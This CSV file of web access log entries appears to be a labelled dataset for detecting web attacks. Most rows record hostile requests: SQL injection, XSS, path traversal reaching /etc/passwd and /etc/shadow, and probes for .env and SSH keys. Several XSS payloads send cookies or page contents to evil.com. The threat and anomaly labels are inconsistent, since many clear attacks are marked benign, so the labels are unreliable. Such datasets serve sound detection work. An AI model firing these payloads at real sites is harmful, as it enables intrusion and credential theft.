timestamp,ip,method,url,status,size,raw,parsed,request,potential_threats,message,level,Anomaly_Flag
09/May/2025:23:01:24 +0000,192.168.1.34,GET,/administrator/,302.0,890.0,"192.168.1.34 - - [09/May/2025:23:01:24 +0000] ""GET /administrator/ HTTP/1.1"" 302 890",True,GET /administrator/ HTTP/1.1,,GET /administrator/ HTTP/1.1,INFO,0
09/May/2025:23:01:25 +0000,192.168.1.35,PUT,/,405.0,123.0,"192.168.1.35 - - [09/May/2025:23:01:25 +0000] ""PUT / HTTP/1.1"" 405 123",True,PUT / HTTP/1.1,,PUT / HTTP/1.1,INFO,0
09/May/2025:23:01:26 +0000,192.168.1.36,GET,/.%2e/.%2e/.%2e/etc/passwd,200.0,456.0,"192.168.1.36 - - [09/May/2025:23:01:26 +0000] ""GET /.%2e/.%2e/.%2e/etc/passwd HTTP/1.1"" 200 456",True,GET /.%2e/.%2e/.%2e/etc/passwd HTTP/1.1,,GET /.%2e/.%2e/.%2e/etc/passwd HTTP/1.1,INFO,0
09/May/2025:23:01:27 +0000,192.168.1.37,GET,/details?id=1',200.0,789.0,"192.168.1.37 - - [09/May/2025:23:01:27 +0000] ""GET /details?id=1' UNION ALL SELECT user,password FROM mysql.user -- HTTP/1.1"" 200 789",True,"GET /details?id=1' UNION ALL SELECT user,password FROM mysql.user -- HTTP/1.1",['SQL_INJECTION'],"GET /details?id=1' UNION ALL SELECT user,password FROM mysql.user -- HTTP/1.1",INFO,1
09/May/2025:23:01:28 +0000,192.168.1.38,GET,/page?data=<svg/onload=alert('XSS')>,200.0,901.0,"192.168.1.38 - - [09/May/2025:23:01:28 +0000] ""GET /page?data=<svg/onload=alert('XSS')> HTTP/1.1"" 200 901",True,GET /page?data=<svg/onload=alert('XSS')> HTTP/1.1,['XSS'],GET /page?data=<svg/onload=alert('XSS')> HTTP/1.1,INFO,1
09/May/2025:23:01:29 +0000,192.168.1.39,GET,/backup.zip,403.0,234.0,"192.168.1.39 - - [09/May/2025:23:01:29 +0000] ""GET /backup.zip HTTP/1.1"" 403 234",True,GET /backup.zip HTTP/1.1,,GET /backup.zip HTTP/1.1,INFO,1
09/May/2025:23:01:30 +0000,192.168.1.40,GET,/.git/config,404.0,567.0,"192.168.1.40 - - [09/May/2025:23:01:30 +0000] ""GET /.git/config HTTP/1.1"" 404 567",True,GET /.git/config HTTP/1.1,,GET /.git/config HTTP/1.1,INFO,0
09/May/2025:23:01:31 +0000,192.168.1.41,GET,/search?q=%3Cbody%20onload=alert('XSS')%3E,200.0,890.0,"192.168.1.41 - - [09/May/2025:23:01:31 +0000] ""GET /search?q=%3Cbody%20onload=alert('XSS')%3E HTTP/1.1"" 200 890",True,GET /search?q=%3Cbody%20onload=alert('XSS')%3E HTTP/1.1,['XSS'],GET /search?q=%3Cbody%20onload=alert('XSS')%3E HTTP/1.1,INFO,1
09/May/2025:23:01:32 +0000,192.168.1.42,GET,/../../../../proc/self/environ,404.0,123.0,"192.168.1.42 - - [09/May/2025:23:01:32 +0000] ""GET /../../../../proc/self/environ HTTP/1.1"" 404 123",True,GET /../../../../proc/self/environ HTTP/1.1,,GET /../../../../proc/self/environ HTTP/1.1,INFO,0
09/May/2025:23:01:33 +0000,192.168.1.43,GET,/index.php?id=1;,200.0,456.0,"192.168.1.43 - - [09/May/2025:23:01:33 +0000] ""GET /index.php?id=1; EXEC master.dbo.xp_cmdshell 'dir'; -- HTTP/1.1"" 200 456",True,GET /index.php?id=1; EXEC master.dbo.xp_cmdshell 'dir'; -- HTTP/1.1,,GET /index.php?id=1; EXEC master.dbo.xp_cmdshell 'dir'; -- HTTP/1.1,INFO,0
09/May/2025:23:01:34 +0000,192.168.1.44,GET,/config.ini,403.0,789.0,"192.168.1.44 - - [09/May/2025:23:01:34 +0000] ""GET /config.ini HTTP/1.1"" 403 789",True,GET /config.ini HTTP/1.1,,GET /config.ini HTTP/1.1,INFO,1
09/May/2025:23:01:35 +0000,192.168.1.45,DELETE,/admin/users,403.0,901.0,"192.168.1.45 - - [09/May/2025:23:01:35 +0000] ""DELETE /admin/users HTTP/1.1"" 403 901",True,DELETE /admin/users HTTP/1.1,,DELETE /admin/users HTTP/1.1,INFO,1
09/May/2025:23:01:36 +0000,192.168.1.46,GET,/.%2e/.%2e/.%2e/proc/cpuinfo,200.0,234.0,"192.168.1.46 - - [09/May/2025:23:01:36 +0000] ""GET /.%2e/.%2e/.%2e/proc/cpuinfo HTTP/1.1"" 200 234",True,GET /.%2e/.%2e/.%2e/proc/cpuinfo HTTP/1.1,,GET /.%2e/.%2e/.%2e/proc/cpuinfo HTTP/1.1,INFO,0
09/May/2025:23:01:37 +0000,192.168.1.47,GET,/view.php?id=1',200.0,567.0,"192.168.1.47 - - [09/May/2025:23:01:37 +0000] ""GET /view.php?id=1' OR SLEEP(3) -- HTTP/1.1"" 200 567",True,GET /view.php?id=1' OR SLEEP(3) -- HTTP/1.1,,GET /view.php?id=1' OR SLEEP(3) -- HTTP/1.1,INFO,0
09/May/2025:23:01:38 +0000,192.168.1.48,GET,"/image.png\""'><script>alert('XSS')</script>",200.0,890.0,"192.168.1.48 - - [09/May/2025:23:01:38 +0000] ""GET /image.png\""'><script>alert('XSS')</script> HTTP/1.1"" 200 890",True,"GET /image.png\""'><script>alert('XSS')</script> HTTP/1.1",['XSS'],"GET /image.png\""'><script>alert('XSS')</script> HTTP/1.1",INFO,1
09/May/2025:23:01:39 +0000,192.168.1.49,GET,/logs/access.log,403.0,123.0,"192.168.1.49 - - [09/May/2025:23:01:39 +0000] ""GET /logs/access.log HTTP/1.1"" 403 123",True,GET /logs/access.log HTTP/1.1,,GET /logs/access.log HTTP/1.1,INFO,1
09/May/2025:23:01:40 +0000,192.168.1.50,GET,/.env,404.0,456.0,"192.168.1.50 - - [09/May/2025:23:01:40 +0000] ""GET /.env HTTP/1.1"" 404 456",True,GET /.env HTTP/1.1,,GET /.env HTTP/1.1,INFO,0
09/May/2025:23:01:41 +0000,192.168.1.51,GET,/search?data=%22%3E%3Ciframe%20src=http://evil.com%3E,200.0,789.0,"192.168.1.51 - - [09/May/2025:23:01:41 +0000] ""GET /search?data=%22%3E%3Ciframe%20src=http://evil.com%3E HTTP/1.1"" 200 789",True,GET /search?data=%22%3E%3Ciframe%20src=http://evil.com%3E HTTP/1.1,['XSS'],GET /search?data=%22%3E%3Ciframe%20src=http://evil.com%3E HTTP/1.1,INFO,1
09/May/2025:23:01:42 +0000,192.168.1.52,GET,/../../../../var/www/config.php,404.0,901.0,"192.168.1.52 - - [09/May/2025:23:01:42 +0000] ""GET /../../../../var/www/config.php HTTP/1.1"" 404 901",True,GET /../../../../var/www/config.php HTTP/1.1,,GET /../../../../var/www/config.php HTTP/1.1,INFO,0
09/May/2025:23:01:43 +0000,192.168.1.53,GET,/item.php?id=1,200.0,234.0,"192.168.1.53 - - [09/May/2025:23:01:43 +0000] ""GET /item.php?id=1 UNION ALL SELECT @@version -- HTTP/1.1"" 200 234",True,GET /item.php?id=1 UNION ALL SELECT @@version -- HTTP/1.1,,GET /item.php?id=1 UNION ALL SELECT @@version -- HTTP/1.1,INFO,0
09/May/2025:23:01:44 +0000,192.168.1.54,GET,/web.config,403.0,567.0,"192.168.1.54 - - [09/May/2025:23:01:44 +0000] ""GET /web.config HTTP/1.1"" 403 567",True,GET /web.config HTTP/1.1,,GET /web.config HTTP/1.1,INFO,1
09/May/2025:23:01:45 +0000,192.168.1.55,TRACE,/admin,405.0,890.0,"192.168.1.55 - - [09/May/2025:23:01:45 +0000] ""TRACE /admin HTTP/1.1"" 405 890",True,TRACE /admin HTTP/1.1,,TRACE /admin HTTP/1.1,INFO,0
09/May/2025:23:01:46 +0000,192.168.1.56,GET,/scripts/..%2f..%2fetc/passwd,200.0,123.0,"192.168.1.56 - - [09/May/2025:23:01:46 +0000] ""GET /scripts/..%2f..%2fetc/passwd HTTP/1.1"" 200 123",True,GET /scripts/..%2f..%2fetc/passwd HTTP/1.1,,GET /scripts/..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:01:47 +0000,192.168.1.57,GET,/product?id=1',200.0,456.0,"192.168.1.57 - - [09/May/2025:23:01:47 +0000] ""GET /product?id=1' OR 'x'='x' HTTP/1.1"" 200 456",True,GET /product?id=1' OR 'x'='x' HTTP/1.1,,GET /product?id=1' OR 'x'='x' HTTP/1.1,INFO,0
09/May/2025:23:01:48 +0000,192.168.1.58,GET,/index.html<script,200.0,789.0,"192.168.1.58 - - [09/May/2025:23:01:48 +0000] ""GET /index.html<script type='text/javascript'>alert('XSS');</script> HTTP/1.1"" 200 789",True,GET /index.html<script type='text/javascript'>alert('XSS');</script> HTTP/1.1,['XSS'],GET /index.html<script type='text/javascript'>alert('XSS');</script> HTTP/1.1,INFO,1
09/May/2025:23:01:49 +0000,192.168.1.59,GET,/debug/info,403.0,901.0,"192.168.1.59 - - [09/May/2025:23:01:49 +0000] ""GET /debug/info HTTP/1.1"" 403 901",True,GET /debug/info HTTP/1.1,,GET /debug/info HTTP/1.1,INFO,1
09/May/2025:23:01:50 +0000,192.168.1.60,GET,/.htaccess,404.0,234.0,"192.168.1.60 - - [09/May/2025:23:01:50 +0000] ""GET /.htaccess HTTP/1.1"" 404 234",True,GET /.htaccess HTTP/1.1,,GET /.htaccess HTTP/1.1,INFO,0
09/May/2025:23:01:51 +0000,192.168.1.61,GET,/search?q=%3Cimg%20src=%22javascript:alert('XSS')%22%3E,200.0,567.0,"192.168.1.61 - - [09/May/2025:23:01:51 +0000] ""GET /search?q=%3Cimg%20src=%22javascript:alert('XSS')%22%3E HTTP/1.1"" 200 567",True,GET /search?q=%3Cimg%20src=%22javascript:alert('XSS')%22%3E HTTP/1.1,['XSS'],GET /search?q=%3Cimg%20src=%22javascript:alert('XSS')%22%3E HTTP/1.1,INFO,1
09/May/2025:23:01:52 +0000,192.168.1.62,GET,/../../../../../../../../etc/passwd,404.0,890.0,"192.168.1.62 - - [09/May/2025:23:01:52 +0000] ""GET /../../../../../../../../etc/passwd HTTP/1.1"" 404 890",True,GET /../../../../../../../../etc/passwd HTTP/1.1,,GET /../../../../../../../../etc/passwd HTTP/1.1,INFO,0
09/May/2025:23:01:53 +0000,192.168.1.63,GET,/itemDetails.php?id=1,200.0,123.0,"192.168.1.63 - - [09/May/2025:23:01:53 +0000] ""GET /itemDetails.php?id=1 UNION /*!40000SELECT*/ @@version -- HTTP/1.1"" 200 123",True,GET /itemDetails.php?id=1 UNION /*!40000SELECT*/ @@version -- HTTP/1.1,,GET /itemDetails.php?id=1 UNION /*!40000SELECT*/ @@version -- HTTP/1.1,INFO,0
09/May/2025:23:01:54 +0000,192.168.1.64,GET,/server-status,403.0,456.0,"192.168.1.64 - - [09/May/2025:23:01:54 +0000] ""GET /server-status HTTP/1.1"" 403 456",True,GET /server-status HTTP/1.1,,GET /server-status HTTP/1.1,INFO,1
09/May/2025:23:01:55 +0000,192.168.1.65,CONNECT,evil.com:80,200.0,0.0,"192.168.1.65 - - [09/May/2025:23:01:55 +0000] ""CONNECT evil.com:80 HTTP/1.1"" 200 0",True,CONNECT evil.com:80 HTTP/1.1,,CONNECT evil.com:80 HTTP/1.1,INFO,0
09/May/2025:23:01:56 +0000,192.168.1.66,GET,/config/database.yml,403.0,789.0,"192.168.1.66 - - [09/May/2025:23:01:56 +0000] ""GET /config/database.yml HTTP/1.1"" 403 789",True,GET /config/database.yml HTTP/1.1,,GET /config/database.yml HTTP/1.1,INFO,1
09/May/2025:23:01:57 +0000,192.168.1.67,GET,/productInfo?id=1',200.0,901.0,"192.168.1.67 - - [09/May/2025:23:01:57 +0000] ""GET /productInfo?id=1' OR 1=1 -- HTTP/1.1"" 200 901",True,GET /productInfo?id=1' OR 1=1 -- HTTP/1.1,['SQL_INJECTION'],GET /productInfo?id=1' OR 1=1 -- HTTP/1.1,INFO,1
09/May/2025:23:01:58 +0000,192.168.1.68,GET,/page.html?data=<input,200.0,234.0,"192.168.1.68 - - [09/May/2025:23:01:58 +0000] ""GET /page.html?data=<input type='text' value='' onfocus=alert('XSS')> HTTP/1.1"" 200 234",True,GET /page.html?data=<input type='text' value='' onfocus=alert('XSS')> HTTP/1.1,['XSS'],GET /page.html?data=<input type='text' value='' onfocus=alert('XSS')> HTTP/1.1,INFO,1
,,,,,,"192.168.1.69 -- - [09/May/2025:23:01:59 +0000] ""GET /admin/users/delete?id=1 HTTP/1.1"" 403 567",False,,,,INFO,0
09/May/2025:23:02:00 +0000,192.168.1.70,GET,/log.txt,404.0,890.0,"192.168.1.70 - - [09/May/2025:23:02:00 +0000] ""GET /log.txt HTTP/1.1"" 404 890",True,GET /log.txt HTTP/1.1,,GET /log.txt HTTP/1.1,INFO,0
09/May/2025:23:02:01 +0000,192.168.1.71,GET,/search?q=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=alert('XSS')%3E,200.0,123.0,"192.168.1.71 - - [09/May/2025:23:02:01 +0000] ""GET /search?q=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=alert('XSS')%3E HTTP/1.1"" 200 123",True,GET /search?q=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=alert('XSS')%3E HTTP/1.1,['XSS'],GET /search?q=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=alert('XSS')%3E HTTP/1.1,INFO,1
09/May/2025:23:02:02 +0000,192.168.1.72,GET,/../../../../../../../../var/log/auth.log,404.0,456.0,"192.168.1.72 - - [09/May/2025:23:02:02 +0000] ""GET /../../../../../../../../var/log/auth.log HTTP/1.1"" 404 456",True,GET /../../../../../../../../var/log/auth.log HTTP/1.1,,GET /../../../../../../../../var/log/auth.log HTTP/1.1,INFO,0
09/May/2025:23:02:03 +0000,192.168.1.73,GET,/viewItem.php?id=1,200.0,789.0,"192.168.1.73 - - [09/May/2025:23:02:03 +0000] ""GET /viewItem.php?id=1 UNION ALL SELECT table_name FROM information_schema.tables -- HTTP/1.1"" 200 789",True,GET /viewItem.php?id=1 UNION ALL SELECT table_name FROM information_schema.tables -- HTTP/1.1,['SQL_INJECTION'],GET /viewItem.php?id=1 UNION ALL SELECT table_name FROM information_schema.tables -- HTTP/1.1,INFO,1
09/May/2025:23:02:04 +0000,192.168.1.74,GET,/phpinfo.php,403.0,901.0,"192.168.1.74 - - [09/May/2025:23:02:04 +0000] ""GET /phpinfo.php HTTP/1.1"" 403 901",True,GET /phpinfo.php HTTP/1.1,,GET /phpinfo.php HTTP/1.1,INFO,1
09/May/2025:23:02:05 +0000,192.168.1.75,CONNECT,proxy.evil.com:443,200.0,0.0,"192.168.1.75 - - [09/May/2025:23:02:05 +0000] ""CONNECT proxy.evil.com:443 HTTP/1.1"" 200 0",True,CONNECT proxy.evil.com:443 HTTP/1.1,,CONNECT proxy.evil.com:443 HTTP/1.1,INFO,0
09/May/2025:23:02:06 +0000,192.168.1.76,GET,/backup.sql,403.0,234.0,"192.168.1.76 - - [09/May/2025:23:02:06 +0000] ""GET /backup.sql HTTP/1.1"" 403 234",True,GET /backup.sql HTTP/1.1,,GET /backup.sql HTTP/1.1,INFO,1
09/May/2025:23:02:07 +0000,192.168.1.77,GET,/news?id=1',200.0,567.0,"192.168.1.77 - - [09/May/2025:23:02:07 +0000] ""GET /news?id=1' OR 'a'='a' HTTP/1.1"" 200 567",True,GET /news?id=1' OR 'a'='a' HTTP/1.1,,GET /news?id=1' OR 'a'='a' HTTP/1.1,INFO,0
09/May/2025:23:02:08 +0000,192.168.1.78,GET,/index.php?param=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>,200.0,890.0,"192.168.1.78 - - [09/May/2025:23:02:08 +0000] ""GET /index.php?param=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script> HTTP/1.1"" 200 890",True,GET /index.php?param=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script> HTTP/1.1,['XSS'],GET /index.php?param=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script> HTTP/1.1,INFO,1
09/May/2025:23:02:09 +0000,192.168.1.79,GET,/sensitive/,401.0,123.0,"192.168.1.79 - - [09/May/2025:23:02:09 +0000] ""GET /sensitive/ HTTP/1.1"" 401 123",True,GET /sensitive/ HTTP/1.1,,GET /sensitive/ HTTP/1.1,INFO,1
09/May/2025:23:02:10 +0000,192.168.1.80,GET,/.svn/entries,404.0,456.0,"192.168.1.80 - - [09/May/2025:23:02:10 +0000] ""GET /.svn/entries HTTP/1.1"" 404 456",True,GET /.svn/entries HTTP/1.1,,GET /.svn/entries HTTP/1.1,INFO,0
09/May/2025:23:02:11 +0000,192.168.1.81,GET,/search?input=%3Cmarquee%20onstart=alert('XSS')%3E,200.0,789.0,"192.168.1.81 - - [09/May/2025:23:02:11 +0000] ""GET /search?input=%3Cmarquee%20onstart=alert('XSS')%3E HTTP/1.1"" 200 789",True,GET /search?input=%3Cmarquee%20onstart=alert('XSS')%3E HTTP/1.1,['XSS'],GET /search?input=%3Cmarquee%20onstart=alert('XSS')%3E HTTP/1.1,INFO,1
09/May/2025:23:02:12 +0000,192.168.1.82,GET,/../../../../../../../../etc/shadow,404.0,901.0,"192.168.1.82 - - [09/May/2025:23:02:12 +0000] ""GET /../../../../../../../../etc/shadow HTTP/1.1"" 404 901",True,GET /../../../../../../../../etc/shadow HTTP/1.1,,GET /../../../../../../../../etc/shadow HTTP/1.1,INFO,0
09/May/2025:23:02:13 +0000,192.168.1.83,GET,/viewDetails.php?id=1,200.0,234.0,"192.168.1.83 - - [09/May/2025:23:02:13 +0000] ""GET /viewDetails.php?id=1 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' -- HTTP/1.1"" 200 234",True,GET /viewDetails.php?id=1 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' -- HTTP/1.1,['SQL_INJECTION'],GET /viewDetails.php?id=1 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' -- HTTP/1.1,INFO,1
09/May/2025:23:02:14 +0000,192.168.1.84,GET,/test.php,403.0,567.0,"192.168.1.84 - - [09/May/2025:23:02:14 +0000] ""GET /test.php HTTP/1.1"" 403 567",True,GET /test.php HTTP/1.1,,GET /test.php HTTP/1.1,INFO,1
09/May/2025:23:02:15 +0000,192.168.1.85,PUT,/admin/users/1,403.0,890.0,"192.168.1.85 - - [09/May/2025:23:02:15 +0000] ""PUT /admin/users/1 HTTP/1.1"" 403 890",True,PUT /admin/users/1 HTTP/1.1,,PUT /admin/users/1 HTTP/1.1,INFO,1
09/May/2025:23:02:16 +0000,192.168.1.86,GET,/scripts/..%2f..%2f..%2fetc/passwd,200.0,123.0,"192.168.1.86 - - [09/May/2025:23:02:16 +0000] ""GET /scripts/..%2f..%2f..%2fetc/passwd HTTP/1.1"" 200 123",True,GET /scripts/..%2f..%2f..%2fetc/passwd HTTP/1.1,,GET /scripts/..%2f..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:02:17 +0000,192.168.1.87,GET,/itemInfo?id=1',200.0,456.0,"192.168.1.87 - - [09/May/2025:23:02:17 +0000] ""GET /itemInfo?id=1' UNION SELECT null, version() -- HTTP/1.1"" 200 456",True,"GET /itemInfo?id=1' UNION SELECT null, version() -- HTTP/1.1",,"GET /itemInfo?id=1' UNION SELECT null, version() -- HTTP/1.1",INFO,0
09/May/2025:23:02:18 +0000,192.168.1.88,GET,/pageContent.html?data=<img,200.0,789.0,"192.168.1.88 - - [09/May/2025:23:02:18 +0000] ""GET /pageContent.html?data=<img src=1 onerror=prompt('XSS')> HTTP/1.1"" 200 789",True,GET /pageContent.html?data=<img src=1 onerror=prompt('XSS')> HTTP/1.1,['XSS'],GET /pageContent.html?data=<img src=1 onerror=prompt('XSS')> HTTP/1.1,INFO,1
09/May/2025:23:02:19 +0000,192.168.1.89,GET,/debug.log,403.0,901.0,"192.168.1.89 - - [09/May/2025:23:02:19 +0000] ""GET /debug.log HTTP/1.1"" 403 901",True,GET /debug.log HTTP/1.1,,GET /debug.log HTTP/1.1,INFO,1
09/May/2025:23:02:20 +0000,192.168.1.90,GET,/.bash_history,404.0,234.0,"192.168.1.90 - - [09/May/2025:23:02:20 +0000] ""GET /.bash_history HTTP/1.1"" 404 234",True,GET /.bash_history HTTP/1.1,,GET /.bash_history HTTP/1.1,INFO,0
09/May/2025:23:02:21 +0000,192.168.1.91,GET,/search?q=%3Cdetails%20open%20onload=alert('XSS')%3E,200.0,567.0,"192.168.1.91 - - [09/May/2025:23:02:21 +0000] ""GET /search?q=%3Cdetails%20open%20onload=alert('XSS')%3E HTTP/1.1"" 200 567",True,GET /search?q=%3Cdetails%20open%20onload=alert('XSS')%3E HTTP/1.1,['XSS'],GET /search?q=%3Cdetails%20open%20onload=alert('XSS')%3E HTTP/1.1,INFO,1
09/May/2025:23:02:22 +0000,192.168.1.92,GET,/../../../../../../../../var/www/html/wp-config.php,404.0,890.0,"192.168.1.92 - - [09/May/2025:23:02:22 +0000] ""GET /../../../../../../../../var/www/html/wp-config.php HTTP/1.1"" 404 890",True,GET /../../../../../../../../var/www/html/wp-config.php HTTP/1.1,,GET /../../../../../../../../var/www/html/wp-config.php HTTP/1.1,INFO,0
09/May/2025:23:02:23 +0000,192.168.1.93,GET,/productView.php?id=1,200.0,123.0,"192.168.1.93 - - [09/May/2025:23:02:23 +0000] ""GET /productView.php?id=1 UNION ALL SELECT @@datadir -- HTTP/1.1"" 200 123",True,GET /productView.php?id=1 UNION ALL SELECT @@datadir -- HTTP/1.1,,GET /productView.php?id=1 UNION ALL SELECT @@datadir -- HTTP/1.1,INFO,0
09/May/2025:23:02:24 +0000,192.168.1.94,GET,/admin/logs,403.0,456.0,"192.168.1.94 - - [09/May/2025:23:02:24 +0000] ""GET /admin/logs HTTP/1.1"" 403 456",True,GET /admin/logs HTTP/1.1,,GET /admin/logs HTTP/1.1,INFO,1
09/May/2025:23:02:25 +0000,192.168.1.95,DELETE,/api/users/123,403.0,789.0,"192.168.1.95 - - [09/May/2025:23:02:25 +0000] ""DELETE /api/users/123 HTTP/1.1"" 403 789",True,DELETE /api/users/123 HTTP/1.1,,DELETE /api/users/123 HTTP/1.1,INFO,1
09/May/2025:23:02:26 +0000,192.168.1.96,GET,/include/..%2f..%2f..%2fetc/passwd,200.0,901.0,"192.168.1.96 - - [09/May/2025:23:02:26 +0000] ""GET /include/..%2f..%2f..%2fetc/passwd HTTP/1.1"" 200 901",True,GET /include/..%2f..%2f..%2fetc/passwd HTTP/1.1,,GET /include/..%2f..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:02:27 +0000,192.168.1.97,GET,/articleDetails?id=1',200.0,234.0,"192.168.1.97 - - [09/May/2025:23:02:27 +0000] ""GET /articleDetails?id=1' OR '1'='2' -- HTTP/1.1"" 200 234",True,GET /articleDetails?id=1' OR '1'='2' -- HTTP/1.1,,GET /articleDetails?id=1' OR '1'='2' -- HTTP/1.1,INFO,0
09/May/2025:23:02:28 +0000,192.168.1.98,GET,/site.php?page=<svg><script>alert('XSS')</script></svg>,200.0,567.0,"192.168.1.98 - - [09/May/2025:23:02:28 +0000] ""GET /site.php?page=<svg><script>alert('XSS')</script></svg> HTTP/1.1"" 200 567",True,GET /site.php?page=<svg><script>alert('XSS')</script></svg> HTTP/1.1,['XSS'],GET /site.php?page=<svg><script>alert('XSS')</script></svg> HTTP/1.1,INFO,1
09/May/2025:23:02:29 +0000,192.168.1.99,GET,/config.php.bak,403.0,890.0,"192.168.1.99 - - [09/May/2025:23:02:29 +0000] ""GET /config.php.bak HTTP/1.1"" 403 890",True,GET /config.php.bak HTTP/1.1,,GET /config.php.bak HTTP/1.1,INFO,1
09/May/2025:23:02:30 +0000,192.168.1.100,GET,/.ssh/id_rsa,404.0,123.0,"192.168.1.100 - - [09/May/2025:23:02:30 +0000] ""GET /.ssh/id_rsa HTTP/1.1"" 404 123",True,GET /.ssh/id_rsa HTTP/1.1,,GET /.ssh/id_rsa HTTP/1.1,INFO,0
09/May/2025:23:02:31 +0000,192.168.1.101,GET,/search?q=%3Cscript>window.location='http://evil.com/steal.php?data='+document.all[0].innerHTML</script>,200.0,456.0,"192.168.1.101 - - [09/May/2025:23:02:31 +0000] ""GET /search?q=%3Cscript>window.location='http://evil.com/steal.php?data='+document.all[0].innerHTML</script> HTTP/1.1"" 200 456",True,GET /search?q=%3Cscript>window.location='http://evil.com/steal.php?data='+document.all[0].innerHTML</script> HTTP/1.1,['XSS'],GET /search?q=%3Cscript>window.location='http://evil.com/steal.php?data='+document.all[0].innerHTML</script> HTTP/1.1,INFO,1
09/May/2025:23:02:32 +0000,192.168.1.102,GET,/../../../../../../../../var/log/httpd/error_log,404.0,789.0,"192.168.1.102 - - [09/May/2025:23:02:32 +0000] ""GET /../../../../../../../../var/log/httpd/error_log HTTP/1.1"" 404 789",True,GET /../../../../../../../../var/log/httpd/error_log HTTP/1.1,,GET /../../../../../../../../var/log/httpd/error_log HTTP/1.1,INFO,0
09/May/2025:23:02:33 +0000,192.168.1.103,GET,/show.php?item=1,200.0,901.0,"192.168.1.103 - - [09/May/2025:23:02:33 +0000] ""GET /show.php?item=1 UNION ALL SELECT user() -- HTTP/1.1"" 200 901",True,GET /show.php?item=1 UNION ALL SELECT user() -- HTTP/1.1,,GET /show.php?item=1 UNION ALL SELECT user() -- HTTP/1.1,INFO,0
09/May/2025:23:02:34 +0000,192.168.1.104,GET,/admin/config/edit,403.0,234.0,"192.168.1.104 - - [09/May/2025:23:02:34 +0000] ""GET /admin/config/edit HTTP/1.1"" 403 234",True,GET /admin/config/edit HTTP/1.1,,GET /admin/config/edit HTTP/1.1,INFO,1
09/May/2025:23:02:35 +0000,192.168.1.105,TRACE,/,405.0,567.0,"192.168.1.105 - - [09/May/2025:23:02:35 +0000] ""TRACE / HTTP/1.1"" 405 567",True,TRACE / HTTP/1.1,,TRACE / HTTP/1.1,INFO,0
09/May/2025:23:02:36 +0000,192.168.1.106,GET,/themes/..%2f..%2f..%2fetc/passwd,200.0,890.0,"192.168.1.106 - - [09/May/2025:23:02:36 +0000] ""GET /themes/..%2f..%2f..%2fetc/passwd HTTP/1.1"" 200 890",True,GET /themes/..%2f..%2f..%2fetc/passwd HTTP/1.1,,GET /themes/..%2f..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:02:37 +0000,192.168.1.107,GET,/view.php?id=1',200.0,123.0,"192.168.1.107 - - [09/May/2025:23:02:37 +0000] ""GET /view.php?id=1' OR 'true'='true' -- HTTP/1.1"" 200 123",True,GET /view.php?id=1' OR 'true'='true' -- HTTP/1.1,,GET /view.php?id=1' OR 'true'='true' -- HTTP/1.1,INFO,0
09/May/2025:23:02:38 +0000,192.168.1.108,GET,/index.jsp?data=<style>*{behavior:url(http://evil.com/xss.htc)}</style>,200.0,456.0,"192.168.1.108 - - [09/May/2025:23:02:38 +0000] ""GET /index.jsp?data=<style>*{behavior:url(http://evil.com/xss.htc)}</style> HTTP/1.1"" 200 456",True,GET /index.jsp?data=<style>*{behavior:url(http://evil.com/xss.htc)}</style> HTTP/1.1,['XSS'],GET /index.jsp?data=<style>*{behavior:url(http://evil.com/xss.htc)}</style> HTTP/1.1,INFO,1
09/May/2025:23:02:39 +0000,192.168.1.109,GET,/sql_dump.gz,403.0,789.0,"192.168.1.109 - - [09/May/2025:23:02:39 +0000] ""GET /sql_dump.gz HTTP/1.1"" 403 789",True,GET /sql_dump.gz HTTP/1.1,,GET /sql_dump.gz HTTP/1.1,INFO,1
